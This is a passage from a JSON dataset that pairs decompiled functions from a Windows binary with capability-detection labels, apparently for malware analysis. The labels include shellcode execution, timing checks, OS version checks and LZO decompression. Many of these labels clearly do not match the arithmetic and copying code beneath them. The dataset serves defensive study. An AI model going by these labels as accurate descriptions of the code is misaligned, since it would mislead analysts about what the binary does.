piVar9[6] = 0;\n    fcn.14009fa40(piVar1);\n    *piVar9 = iVar3;\n    pauVar13 = *0x140103070;\n    piVar9[8] = iVar14;\n    *(piVar9 + 9) = 0xffffffff;\n    fcn.1400ad7a0(*pauVar13 + 8);\n    *pauVar13 = auVar16;\n    *pauVar13[0xe] = 0;\n    *(pauVar13[0xe] + 8) = 0;\n    pauVar13[0xf] = 0x0;\n    pauVar13[0x10] = 0x0;\n    fcn.1400ae820(*pauVar13 + 8, piVar10);\n    piVar10 = *0x140103040;\n    piVar1 = *0x140103040 + 2;\n    fcn.1400ad7a0(piVar1);\n    *(piVar10 + 0x1e) = 0;\n    iVar2 = *0x1401031d0;\n    piVar10[0x1d] = 0;\n    piVar10[1] = 0;\n    *piVar10 = iVar2 + 0x18;\n    piVar10[2] = iVar2 + 0x40;\n    *(piVar10 + 0x1f) = 0x0;\n    *(piVar10 + 0x21) = 0x0;\n    fcn.1400ae820(piVar1, piVar8);\n    pauVar11 = *0x140103050;\n    puVar5 = **0x140103050;\n    fcn.1400ad7a0(puVar5 + 8);\n    *(pauVar11[0xe] + 8) = 0;\n    *pauVar11[0xe] = 0;\n    pauVar11[0xf] = 0x0;\n    pauVar11[0x10] = 0x0;\n    *pauVar11 = auVar16;\n    fcn.1400ae820(puVar5 + 8, piVar9);\n    pauVar12 = *0x140103060;\n    puVar5 = **0x140103060;\n    fcn.1400ad7a0(puVar5 + 8);\n    *(pauVar12[0xe] + 8) = 0;\n    *pauVar12[0xe] = 0;\n    pauVar12[0xf] = 0x0;\n    pauVar12[0x10] = 0x0;\n    *pauVar12 = auVar16;\n    fcn.1400ae820(puVar5 + 8, piVar9);\n    piVar10[0x1d] = pauVar13;\n    *pauVar11[0xe] = pauVar13;\n    *pauVar11[2] = *pauVar11[2] | 0x2000;\n    iVar14 = (*pcVar6)(1);\n    iVar2 = *0x140103340;\n    piVar10 = *0x140102b00;\n    piVar1 = *0x140102b00 + 7;\n    (*0x140102b00)[1] = 0;\n    iVar2 = iVar2 + 0x10;\n    piVar10[2] = 0;\n    *piVar10 = iVar2;\n    piVar10[3] = 0;\n    piVar10[4] = 0;\n    piVar10[5] = 0;\n    piVar10[6] = 0;\n    fcn.14009fa40(piVar1);\n    iVar3 = *0x1401030e0;\n    *(piVar10 + 9) = 0xffff;\n    iVar3 = iVar3 + 0x10;\n    piVar10[8] = iVar14;\n    *piVar10 = iVar3;\n    iVar14 = (*pcVar6)(0);\n    piVar8 = *0x140102ae0;\n    piVar1 = *0x140102ae0 + 7;\n    **0x140102ae0 = iVar2;\n    piVar8[1] = 0;\n    piVar8[2] = 0;\n    piVar8[3] = 0;\n    piVar8[4] = 0;\n    piVar8[5] = 0;\n    piVar8[6] = 0;\n    fcn.14009fa40(piVar1);\n    *piVar8 = iVar3;\n    *(piVar8 + 9) = 0xffff;\n    piVar8[8] = iVar14;\n    iVar14 = (*pcVar6)(2);\n    piVar9 = *0x140102af0;\n    piVar1 = *0x140102af0 + 7;\n    **0x140102af0 = iVar2;\n    piVar9[1] = 0;\n    piVar9[2] = 0;\n    piVar9[3] = 0;\n    piVar9[4] = 0;\n    piVar9[5] = 0;\n    piVar9[6] = 0;\n    fcn.14009fa40(piVar1);\n    piVar9[8] = iVar14;\n    pauVar13 = *0x1401030b0;\n    *piVar9 = iVar3;\n    *(piVar9 + 9) = 0xffff;\n    fcn.1400ad7a0(*pauVar13 + 8);\n    *pauVar13[0xe] = 0;\n    *(pauVar13[0xe] + 8) = 0;\n    pauVar13[0xe][10] = 0;\n    pauVar13[0xf] = 0x0;\n    pauVar13[0x10] = 0x0;\n    *pauVar13 = auVar15;\n    fcn.1400af1f0(*pauVar13 + 8, piVar10);\n    piVar10 = *0x140103080;\n    piVar1 = *0x140103080 + 2;\n    fcn.1400ad7a0(piVar1);\n    iVar2 = *0x1401032d0;\n    *(piVar10 + 0x1e) = 0;\n    piVar10[0x1d] = 0;\n    *(piVar10 + 0xf2) = 0;\n    *piVar10 = iVar2 + 0x18;\n    piVar10[2] = iVar2 + 0x40;\n    piVar10[1] = 0;\n    *(piVar10 + 0x1f) = 0x0;\n    *(piVar10 + 0x21) = 0x0;\n    fcn.1400af1f0(piVar1, piVar8);\n    pauVar11 = *0x140103090;\n    puVar5 = **0x140103090;\n    fcn.1400ad7a0(puVar5 + 8);\n    *(pauVar11[0xe] + 8) = 0;\n    *pauVar11[0xe] = 0;\n    pauVar11[0xe][10] = 0;\n    pauVar11[0xf] = 0x0;\n    pauVar11[0x10] = 0x0;\n    *pauVar11 = auVar15;\n    fcn.1400af1f0(puVar5 + 8, piVar9);\n    pauVar12 = *0x1401030a0;\n    puVar5 = **0x1401030a0;\n    fcn.1400ad7a0(puVar5 + 8);\n    *(pauVar12[0xe] + 8) = 0;\n    *pauVar12[0xe] = 0;\n    pauVar12[0xe][10] = 0;\n    pauVar12[0xf] = 0x0;\n    pauVar12[0x10] = 0x0;\n    *pauVar12 = auVar15;\n    fcn.1400af1f0(puVar5 + 8, piVar9);\n    piVar7 = *0x140102a70;\n    *pauVar11[2] = *pauVar11[2] | 0x2000;\n    piVar10[0x1d] = pauVar13;\n    iVar4 = *piVar7;\n    *pauVar11[0xe] = pauVar13;\n    if (iVar4 == 0) {\n        **0x140102f50 = **0x140102f50 + 1;\n    }\n    else {\n        LOCK();\n        **0x140102f50 = **0x140102f50 + 1;\n    }\n    return;\n}\n",
        "token_count": 2732
    },
    "1400ad36": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid fcn.1400ad360(int64_t arg1, int64_t arg2)\n\n{\n    uint uVar1;\n    ulong uVar2;\n    int64_t iVar3;\n    ulong uVar4;\n    int64_t iVar5;\n    int64_t iVar6;\n    int64_t iVar7;\n    int64_t iVar8;\n    uint uStack48;\n    uchar auStack32 [8];\n    \n    uVar2 = *(arg1 + 8);\n    iVar6 = arg1 + 0x40;\n    iVar5 = arg2 + 0x40;\n    *(arg1 + 8) = *(arg2 + 8);\n    *(arg2 + 8) = uVar2;\n    uVar2 = *(arg1 + 0x10);\n    *(arg1 + 0x10) = *(arg2 + 0x10);\n    *(arg2 + 0x10) = uVar2;\n    uVar1 = *(arg1 + 0x18);\n    *(arg1 + 0x18) = *(arg2 + 0x18);\n    *(arg2 + 0x18) = uVar1;\n    uVar1 = *(arg1 + 0x1c);\n    *(arg1 + 0x1c) = *(arg2 + 0x1c);\n    *(arg2 + 0x1c) = uVar1;\n    uVar1 = *(arg1 + 0x20);\n    *(arg1 + 0x20) = *(arg2 + 0x20);\n    *(arg2 + 0x20) = uVar1;\n    uVar2 = *(arg1 + 0x28);\n    *(arg1 + 0x28) = *(arg2 + 0x28);\n    iVar7 = *(arg2 + 200);\n    *(arg2 + 0x28) = uVar2;\n    iVar3 = *(arg1 + 200);\n    if (iVar3 == iVar6) {\n        if (iVar7 == iVar5) {\n            iVar6 = 0x40;\n            do {\n                uVar2 = *(arg1 + iVar6);\n                uVar4 = *(arg1 + 8 + iVar6);\n                *(arg1 + iVar6) = *(arg2 + iVar6);\n                *(arg1 + 8 + iVar6) = *(arg2 + 8 + iVar6);\n                *(arg2 + iVar6) = uVar2;\n                uStack48 = uVar4;\n                *(arg2 + 8 + iVar6) = uStack48;\n                iVar6 = iVar6 + 0x10;\n            } while (iVar6 != 0xc0);\n            goto code_r0x0001400ad46d;\n        }\n        if (iVar3 != iVar6) goto code_r0x0001400ad440;\ncode_r0x0001400ad3ed:\n        iVar7 = arg1;\n        iVar8 = arg2;\n        if (iVar3 == iVar6) {\n            iVar7 = arg2;\n            iVar8 = arg1;\n            iVar6 = iVar5;\n        }\n        iVar5 = 0x40;\n        do {\n            *(iVar7 + iVar5) = *(iVar8 + iVar5);\n            *(iVar7 + 8 + iVar5) = *(iVar8 + 8 + iVar5);\n            iVar5 = iVar5 + 0x10;\n        } while (iVar5 != 0xc0);\n        *(iVar8 + 200) = *(iVar7 + 200);\n        *(iVar7 + 200) = iVar6;\n    }\n    else {\ncode_r0x0001400ad440:\n        if (iVar7 == iVar5) goto code_r0x0001400ad3ed;\n        *(arg1 + 200) = iVar7;\n        *(arg2 + 200) = iVar3;\n    }\n    uVar1 = *(arg1 + 0xc0);\n    *(arg1 + 0xc0) = *(arg2 + 0xc0);\n    *(arg2 + 0xc0) = uVar1;\ncode_r0x0001400ad46d:\n    fcn.14009fa10(auStack32, arg1 + 0xd0);\n    fcn.14009fb80(arg1 + 0xd0, arg2 + 0xd0);\n    fcn.14009fb80(arg2 + 0xd0, auStack32);\n    fcn.14009fb20(auStack32);\n    return;\n}\n",
        "token_count": 984
    },
    "1400ad7a": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid fcn.1400ad7a0(ulong *arg1)\n\n{\n    int32_t *piVar1;\n    int32_t **ppiVar2;\n    int32_t iVar3;\n    int32_t **hSemaphore;\n    ulong *puVar4;\n    int32_t **ppiVar5;\n    ulong *puVar6;\n    int32_t **ppiVar7;\n    int32_t *piVar8;\n    \n    *arg1 = 0x14010c370;\n    arg1[3] = 0;\n    *(arg1 + 4) = 0;\n    *(arg1 + 7) = 0;\n    *(arg1 + 1) = 0x0;\n    *(arg1 + 5) = 0x0;\n    puVar4 = arg1 + 8;\n    do {\n        *puVar4 = 0;\n        puVar6 = puVar4 + 2;\n        *(puVar4 + 1) = 0;\n        puVar4 = puVar6;\n    } while (puVar6 != arg1 + 0x18);\n    arg1[0x19] = arg1 + 8;\n    ppiVar7 = arg1 + 0x1a;\n    *(arg1 + 0x18) = 8;\n    *ppiVar7 = NULL;\n    fcn.14009ca10(0);\n    ppiVar2 = *0x140102d70;\n    ppiVar5 = *0x140102d30;\n    piVar1 = **0x140102d70;\n    *ppiVar7 = piVar1;\n    if (piVar1 == *ppiVar5) {\n        return;\n    }\n    hSemaphore = fcn.14001a0a0();\n    piVar1 = *0x140102a70;\n    ppiVar5 = hSemaphore;\n    if (**0x140102a70 != 0) goto code_r0x00014009fae0;\n    piVar8 = *ppiVar2;\n    do {\n        *piVar8 = *piVar8 + 1;\n        while( true ) {\n            iVar3 = *piVar1;\n            *ppiVar7 = piVar8;\n            if (iVar3 == 0) {\n                return;\n            }\n            iVar3 = fcn.14000eab0(hSemaphore);\n            if (iVar3 == 0) {\n                return;\n            }\n            puVar4 = fcn.1400b6600(8);\n            *puVar4 = 0x140109120;\n            ppiVar5 = fcn.1400b6bc0(puVar4, 0x1401046e0, 0x14001bba0);\ncode_r0x00014009fae0:\n            iVar3 = fcn.14000ea40(ppiVar5);\n            if (iVar3 != 0) {\n                fcn.14001bf00();\n                fcn.14000f000(ppiVar5);\n                piVar1 = *ppiVar5;\n                if (piVar1 != *0x1400fb720) {\n                    if (**0x140102a70 == 0) {\n                        iVar3 = *piVar1;\n                        *piVar1 = iVar3 + -1;\n                    }\n                    else {\n                        LOCK();\n                        iVar3 = *piVar1;\n                        *piVar1 = *piVar1 + -1;\n                    }\n                    if (iVar3 == 1) {\n                        fcn.14009f4c0(piVar1);\n    // WARNING: Could not recover jumptable at 0x0001400185e0. Too many branches\n    // WARNING: Treating indirect jump as call\n                        (*_sym.imp.msvcrt.dll_free)(piVar1);\n                        return;\n                    }\n                }\n                return;\n            }\n            piVar8 = *ppiVar2;\n            if (*piVar1 == 0) break;\n            LOCK();\n            *piVar8 = *piVar8 + 1;\n            piVar8 = *ppiVar2;\n        }\n    } while( true );\n}\n",
        "token_count": 894
    },
    "1400100c": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\nint64_t fcn.1400100c0(int64_t arg1, ulong arg2)\n\n{\n    uint64_t uVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    uint32_t uVar4;\n    int64_t iVar5;\n    uint64_t uVar6;\n    \n    uVar4 = arg2 + 0x1f >> 5;\n    if (*(arg1 + 8) < uVar4) {\n        fcn.140017070(arg1);\n        arg1 = fcn.140016f80(uVar4);\n    }\n    uVar6 = arg1 + 0x18;\n    iVar2 = arg2 >> 5;\n    if ((arg2 & 0x1f) == 0) {\n        *(arg1 + 0x14) = iVar2;\n        uVar1 = uVar6 + iVar2 * 4;\n        if (uVar6 < uVar1) {\n            iVar5 = ((uVar1 - arg1) - 0x19 & 0xfffffffffffffffc) + 4;\n            if (uVar1 < arg1 + 0x19U) {\n                iVar5 = 4;\n            }\n            sub.msvcrt.dll_memset(uVar6, 0xff, iVar5);\n        }\n        return arg1;\n    }\n    *(arg1 + 0x14) = iVar2 + 1;\n    uVar1 = uVar6 + (iVar2 + 1) * 4;\n    if (uVar6 < uVar1) {\n        iVar5 = ((uVar1 - arg1) - 0x19 & 0xfffffffffffffffc) + 4;\n        if (uVar1 < arg1 + 0x19U) {\n            iVar5 = 4;\n        }\n        iVar3 = sub.msvcrt.dll_memset(uVar6, 0xff, iVar5);\n        uVar6 = iVar3 + iVar5;\n    }\n    *(uVar6 - 4) = *(uVar6 - 4) >> (0x20U - (arg2 & 0x1f) & 0x1f);\n    return arg1;\n}\n",
        "token_count": 477
    },
    "14001688": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\nvoid fcn.140016880(int64_t arg1, ulong arg2)\n\n{\n    uint32_t *puVar1;\n    uint32_t *puVar2;\n    uint32_t uVar3;\n    int8_t iVar4;\n    int32_t iVar5;\n    uint32_t *puVar6;\n    int64_t iVar7;\n    int64_t iVar8;\n    uint32_t *puVar9;\n    uint32_t *puVar10;\n    uint32_t uVar11;\n    \n    iVar7 = *(arg1 + 0x14);\n    if (arg2 >> 5 < *(arg1 + 0x14)) {\n        puVar1 = arg1 + 0x18;\n        iVar8 = arg2 >> 5;\n        puVar2 = puVar1 + iVar7;\n        puVar6 = puVar1 + iVar8;\n        if ((arg2 & 0x1f) == 0) {\n            puVar9 = puVar1;\n            if (puVar2 <= puVar6) goto code_r0x000140016896;\n            do {\n                puVar10 = puVar6 + 1;\n                *puVar9 = *puVar6;\n                puVar6 = puVar10;\n                puVar9 = puVar9 + 1;\n            } while (puVar10 < puVar2);\n            puVar6 = puVar1 + (iVar7 - iVar8);\n        }\n        else {\n            uVar3 = *puVar6;\n            puVar6 = puVar6 + 1;\n            iVar4 = arg2 & 0x1f;\n            uVar11 = uVar3 >> iVar4;\n            puVar9 = puVar1;\n            if (puVar6 < puVar2) {\n                do {\n                    puVar10 = puVar6 + 1;\n                    *puVar9 = *puVar6 << (0x20U - iVar4 & 0x1f) | uVar11;\n                    uVar3 = *puVar6;\n                    uVar11 = uVar3 >> iVar4;\n                    puVar9 = puVar9 + 1;\n                    puVar6 = puVar10;\n                } while (puVar10 < puVar2);\n                puVar6 = arg1 + 0x14 + (iVar7 - iVar8) * 4;\n                *puVar6 = uVar11;\n                if (uVar3 >> iVar4 == 0) goto code_r0x000140016945;\n            }\n            else {\n                *(arg1 + 0x18) = uVar11;\n                puVar6 = puVar1;\n                if (uVar3 >> iVar4 == 0) goto code_r0x000140016896;\n            }\n            puVar6 = puVar6 + 1;\n        }\ncode_r0x000140016945:\n        iVar5 = puVar6 - puVar1 >> 2;\n        *(arg1 + 0x14) = iVar5;\n        if (iVar5 != 0) {\n            return;\n        }\n    }\n    else {\ncode_r0x000140016896:\n        *(arg1 + 0x14) = 0;\n    }\n    *(arg1 + 0x18) = 0;\n    return;\n}\n",
        "token_count": 710
    },
    "14001754": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\nint64_t fcn.140017540(int64_t arg1, ulong arg2)\n\n{\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    uint8_t uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint8_t uVar6;\n    int32_t iVar7;\n    int64_t iVar8;\n    int64_t iVar9;\n    uint64_t arg1_00;\n    int32_t iVar10;\n    uint32_t uVar11;\n    uint32_t *puVar12;\n    uint32_t *puVar13;\n    uint32_t *puVar14;\n    uint32_t *puVar15;\n    int32_t iVar16;\n    \n    arg1_00 = *(arg1 + 8);\n    uVar11 = arg2 >> 5;\n    iVar10 = *(arg1 + 0x14) + uVar11;\n    iVar16 = iVar10 + 1;\n    iVar7 = *(arg1 + 0xc);\n    if (*(arg1 + 0xc) < iVar16) {\n        do {\n            iVar5 = iVar7 * 2;\n            arg1_00 = arg1_00 + 1;\n            iVar4 = iVar7 * -2;\n            iVar7 = iVar5;\n        } while (iVar16 != iVar5 && SBORROW4(iVar16, iVar5) == iVar16 + iVar4 < 0);\n    }\n    iVar8 = fcn.140016f80(arg1_00);\n    if (iVar8 == 0) {\n        return 0;\n    }\n    puVar1 = iVar8 + 0x18;\n    puVar14 = puVar1;\n    if (0 < uVar11) {\n        puVar14 = puVar1 + uVar11;\n        sub.msvcrt.dll_memset(puVar1, 0, uVar11 * 4);\n    }\n    puVar13 = arg1 + 0x18;\n    puVar1 = puVar13 + *(arg1 + 0x14);\n    uVar6 = arg2 & 0x1f;\n    if ((arg2 & 0x1f) == 0) {\n        do {\n            puVar12 = puVar14 + 1;\n            puVar15 = puVar13 + 1;\n            *puVar14 = *puVar13;\n            if (puVar1 <= puVar15) break;\n            puVar14 = puVar14 + 2;\n            puVar13 = puVar13 + 2;\n            *puVar12 = *puVar15;\n        } while (puVar13 < puVar1);\n    }\n    else {\n        uVar11 = 0;\n        puVar15 = puVar14;\n        do {\n            puVar12 = puVar13 + 1;\n            *puVar15 = *puVar13 << uVar6 | uVar11;\n            uVar2 = *puVar13;\n            uVar3 = 0x20 - uVar6 & 0x1f;\n            uVar11 = uVar2 >> uVar3;\n            puVar13 = puVar12;\n            puVar15 = puVar15 + 1;\n        } while (puVar12 < puVar1);\n        iVar9 = (puVar1 + (-0x19 - arg1) & 0xfffffffffffffffcU) + 4;\n        if (puVar1 < arg1 + 0x19U) {\n            iVar9 = 4;\n        }\n        *(puVar14 + iVar9) = uVar11;\n        if (uVar2 >> uVar3 != 0) goto code_r0x000140017622;\n    }\n    iVar16 = iVar10;\ncode_r0x000140017622:\n    *(iVar8 + 0x14) = iVar16;\n    fcn.140017070(arg1);\n    return iVar8;\n}\n",
        "token_count": 849
    },
    "140017d1": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\nuint fcn.140017d10(int64_t arg1, ulong arg2)\n\n{\n    uint32_t *puVar1;\n    uint32_t *puVar2;\n    int32_t iVar3;\n    uint32_t *puVar4;\n    int8_t iVar5;\n    int32_t iVar6;\n    \n    puVar1 = arg1 + 0x18;\n    iVar3 = *(arg1 + 0x14);\n    iVar6 = arg2 >> 5;\n    if (iVar3 < iVar6) {\n        puVar4 = puVar1 + iVar3;\n    }\n    else {\n        puVar4 = puVar1 + iVar6;\n        if (((iVar6 < iVar3) && ((arg2 & 0x1f) != 0)) && (iVar5 = arg2 & 0x1f,  *puVar4 != (*puVar4 >> iVar5) << iVar5))\n        {\n            return 1;\n        }\n    }\n    do {\n        if (puVar4 <= puVar1) {\n            return 0;\n        }\n        puVar2 = puVar4 + -1;\n        puVar4 = puVar4 + -1;\n    } while (*puVar2 == 0);\n    return 1;\n}\n",
        "token_count": 274
    },
    "140011de": {
        "rules": [
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf"
        ],
        "decompiled_code": "\nint64_t fcn.140011de0(int64_t arg1, int64_t arg2)\n\n{\n    ushort *puVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    int64_t arg1_00;\n    ushort *puVar6;\n    int64_t iVar7;\n    ushort *puVar8;\n    ushort *puVar9;\n    uint32_t uVar10;\n    int64_t iVar11;\n    uint32_t *puVar12;\n    \n    iVar7 = arg2;\n    if (*(arg2 + 0x14) <= *(arg1 + 0x14)) {\n        iVar7 = arg1;\n        arg1 = arg2;\n    }\n    uVar10 = 0;\n    arg1_00 = fcn.140016f80(*(iVar7 + 8));\n    iVar2 = *(iVar7 + 0x14);\n    iVar11 = 0x18;\n    puVar6 = arg1_00 + 0x18;\n    *(arg1_00 + 0x14) = iVar2;\n    iVar3 = *(arg1 + 0x14);\n    puVar1 = puVar6 + iVar3 * 2;\n    puVar8 = puVar6;\n    do {\n        uVar4 = *(iVar7 + iVar11);\n        uVar5 = *(arg1 + iVar11);\n        puVar9 = puVar8 + 2;\n        iVar11 = iVar11 + 4;\n        uVar10 = (uVar4 & 0xffff) + (uVar5 & 0xffff) + uVar10;\n        *puVar8 = uVar10;\n        uVar10 = (uVar4 >> 0x10) + (uVar5 >> 0x10) + (uVar10 >> 0x10);\n        puVar8[1] = uVar10;\n        uVar10 = uVar10 >> 0x10;\n        puVar8 = puVar9;\n    } while (puVar9 < puVar1);\n    iVar11 = (puVar1 + (-0x19 - arg1_00) & 0xfffffffffffffffcU) + 4;\n    if (puVar1 < arg1_00 + 0x19U) {\n        iVar11 = 4;\n    }\n    puVar12 = iVar7 + 0x18 + iVar11;\n    for (puVar6 = iVar11 + puVar6; puVar6 < puVar1 + (iVar2 - iVar3) * 2; puVar6 = puVar6 + 2) {\n        uVar4 = *puVar12;\n        puVar12 = puVar12 + 1;\n        uVar10 = (uVar4 & 0xffff) + uVar10;\n        *puVar6 = uVar10;\n        uVar10 = (uVar10 >> 0x10) + (uVar4 >> 0x10);\n        puVar6[1] = uVar10;\n        uVar10 = uVar10 >> 0x10;\n    }\n    iVar7 = arg1_00;\n    if (uVar10 != 0) {\n        if (iVar2 == *(arg1_00 + 0xc)) {\n            iVar7 = fcn.140016f80(*(arg1_00 + 8) + 1);\n            sub.msvcrt.dll_memcpy(iVar7 + 0x10, arg1_00 + 0x10, *(arg1_00 + 0x14) * 4 + 8);\n            fcn.140017070(arg1_00);\n            iVar2 = *(iVar7 + 0x14);\n        }\n        *(iVar7 + 0x14) = iVar2 + 1;\n        *(iVar7 + 0x18 + iVar2 * 4) = 1;\n    }\n    return iVar7;\n}\n",
        "token_count": 860
    },
    "14001726": {
        "rules": [
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf"
        ],
        "decompiled_code": "\nint64_t fcn.140017260(int64_t arg1, int64_t arg2)\n\n{\n    uint32_t *puVar1;\n    uint32_t *puVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int64_t iVar6;\n    uint32_t *puVar7;\n    uint64_t uVar8;\n    uint32_t uVar9;\n    uint32_t *puVar10;\n    uint32_t *puVar11;\n    int32_t iVar12;\n    uint32_t *puVar13;\n    uint64_t uVar14;\n    uint32_t *puVar15;\n    int64_t iVar16;\n    \n    iVar12 = *(arg1 + 0x14);\n    iVar3 = *(arg2 + 0x14);\n    iVar16 = arg1;\n    iVar5 = iVar12;\n    if (iVar3 <= iVar12) {\n        iVar16 = arg2;\n        arg2 = arg1;\n        iVar5 = iVar3;\n        iVar3 = iVar12;\n    }\n    uVar9 = *(arg2 + 8);\n    iVar12 = iVar3 + iVar5;\n    if (*(arg2 + 0xc) < iVar12) {\n        uVar9 = uVar9 + 1;\n    }\n    iVar6 = fcn.140016f80(uVar9);\n    if (iVar6 != 0) {\n        puVar7 = iVar6 + 0x18;\n        puVar13 = puVar7 + iVar12;\n        if (puVar7 < puVar13) {\n            puVar7 = sub.msvcrt.dll_memset(puVar7, 0);\n        }\n        puVar15 = iVar16 + 0x18;\n        puVar1 = puVar15 + iVar5;\n        puVar2 = arg2 + 0x18 + iVar3;\n        if (puVar15 < puVar1) {\n            iVar16 = (puVar2 + (-0x19 - arg2) & 0xfffffffffffffffcU) + 4;\n            if (puVar2 < arg2 + 0x19) {\n                iVar16 = 4;\n            }\n            do {\n                while( true ) {\n                    uVar9 = *puVar15;\n                    puVar15 = puVar15 + 1;\n                    if (uVar9 == 0) break;\n                    uVar14 = 0;\n                    puVar10 = puVar7;\n                    puVar11 = arg2 + 0x18;\n                    do {\n                        uVar4 = *puVar11;\n                        puVar11 = puVar11 + 1;\n                        uVar8 = uVar4 * uVar9 + *puVar10 + uVar14;\n                        *puVar10 = uVar8;\n                        uVar14 = uVar8 >> 0x20;\n                        puVar10 = puVar10 + 1;\n                    } while (puVar11 < puVar2);\n                    *(puVar7 + iVar16) = uVar8 >> 0x20;\n                    puVar7 = puVar7 + 1;\n                    if (puVar1 <= puVar15) goto code_r0x000140017383;\n                }\n                puVar7 = puVar7 + 1;\n            } while (puVar15 < puVar1);\n        }\ncode_r0x000140017383:\n        if (0 < iVar12) {\n            do {\n                puVar7 = puVar13 + -1;\n                puVar13 = puVar13 + -1;\n                if (*puVar7 != 0) break;\n                iVar12 = iVar12 + -1;\n            } while (iVar12 != 0);\n        }\n        *(iVar6 + 0x14) = iVar12;\n    }\n    return iVar6;\n}\n",
        "token_count": 825
    },
    "140017ca": {
        "rules": [
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf"
        ],
        "decompiled_code": "\nvoid fcn.140017ca0(uint *arg1, ulong arg2, int64_t arg3)\n\n{\n    uint *puVar1;\n    uint *puVar2;\n    uint *puVar3;\n    uint *puVar4;\n    uint *puVar5;\n    \n    puVar4 = arg3 + 0x18;\n    puVar1 = arg1 + ((arg2 + -1 >> 5) + 1);\n    puVar2 = puVar4 + *(arg3 + 0x14);\n    puVar5 = arg1;\n    if (puVar4 < puVar2) {\n        do {\n            puVar3 = puVar4 + 1;\n            *puVar5 = *puVar4;\n            puVar4 = puVar3;\n            puVar5 = puVar5 + 1;\n        } while (puVar3 < puVar2);\n        arg1 = arg1 + (puVar2 + (-0x19 - arg3) & 0xfffffffffffffffcU) + 4;\n    }\n    if (puVar1 <= arg1) {\n        return;\n    }\n    // WARNING: Could not recover jumptable at 0x000140018640. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*_sym.imp.msvcrt.dll_memset)(arg1, 0, (puVar1 + (-1 - arg1) & 0xfffffffffffffffcU) + 4);\n    return;\n}\n",
        "token_count": 322
    },
    "14001950": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\n// WARNING: Type propagation algorithm not settling\n\nuint8_t * fcn.140019500(int64_t arg1, uint8_t *arg2, ulong *arg3)\n\n{\n    uint8_t uVar1;\n    uint8_t uVar2;\n    ulong uVar3;\n    uint8_t uVar4;\n    uint8_t *puVar5;\n    uint64_t uVar6;\n    \n    uVar3 = 0;\n    if (arg1 != 0) {\n        uVar3 = fcn.14000ed40(arg1);\n    }\n    *arg3 = uVar3;\n    uVar4 = *arg2;\n    arg2 = arg2 + 1;\n    if (uVar4 == 0xff) {\n        arg3[1] = uVar3;\n    }\n    else {\n        uVar3 = fcn.140019700(uVar4, arg1);\n        arg2 = fcn.1400197b0(uVar4, uVar3, arg2, arg3 + 1);\n    }\n    uVar4 = *arg2;\n    arg2 = arg2 + 1;\n    puVar5 = NULL;\n    *(arg3 + 5) = uVar4;\n    if (uVar4 != 0xff) {\n        uVar4 = 0;\n        do {\n            uVar1 = *arg2;\n            arg2 = arg2 + 1;\n            uVar2 = uVar4 & 0x3f;\n            uVar4 = uVar4 + 7;\n            puVar5 = puVar5 | (uVar1 & 0x7f) << uVar2;\n        } while (uVar1 < '\\0');\n        puVar5 = puVar5 + arg2;\n    }\n    arg3[3] = puVar5;\n    puVar5 = arg2 + 1;\n    uVar6 = 0;\n    uVar4 = 0;\n    *(arg3 + 0x29) = *arg2;\n    do {\n        uVar1 = *puVar5;\n        puVar5 = puVar5 + 1;\n        uVar2 = uVar4 & 0x3f;\n        uVar4 = uVar4 + 7;\n        uVar6 = uVar6 | (uVar1 & 0x7f) << uVar2;\n    } while (uVar1 < '\\0');\n    arg3[4] = puVar5 + uVar6;\n    return puVar5;\n}\n",
        "token_count": 548
    },
    "14001765": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint32_t fcn.140017650(int64_t arg1, int64_t arg2)\n\n{\n    int32_t iVar1;\n    uint32_t *puVar2;\n    uint32_t *puVar3;\n    uint32_t uVar4;\n    \n    iVar1 = *(arg2 + 0x14);\n    uVar4 = *(arg1 + 0x14) - iVar1;\n    if (uVar4 == 0) {\n        puVar2 = arg1 + 0x18 + iVar1;\n        puVar3 = arg2 + 0x18 + iVar1 * 4;\n        do {\n            puVar2 = puVar2 + -1;\n            puVar3 = puVar3 + -1;\n            if (*puVar2 != *puVar3) {\n                return -(*puVar2 < *puVar3) | 1;\n            }\n        } while (arg1 + 0x18 < puVar2);\n    }\n    return uVar4;\n}\n",
        "token_count": 218
    },
    "14001788": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
